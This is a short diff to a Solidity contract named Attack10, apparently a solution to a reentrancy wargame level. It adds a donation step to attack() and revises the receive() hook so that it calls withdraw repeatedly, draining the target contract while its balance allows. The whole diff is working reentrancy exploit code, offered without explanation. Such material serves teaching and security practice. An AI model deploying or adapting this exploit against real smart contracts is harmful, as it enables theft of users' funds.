@@ -16,6 +16,8 @@ contract Attack10 {
     }
 
     function attack() public payable {
+        // reentrance.donate{value: msg.value}(address(this));
+        reentrance.donate{value: amount}(address(this));
         reentrance.withdraw(amount);
     }
 
@@ -24,7 +26,9 @@ contract Attack10 {
     }
 
     receive() external payable {
-        if (address(reentrance).balance > amount) {
+        uint targetBalance = address(reentrance).balance;
+
+        if (targetBalance >= amount) {
             reentrance.withdraw(amount);
         }
     }
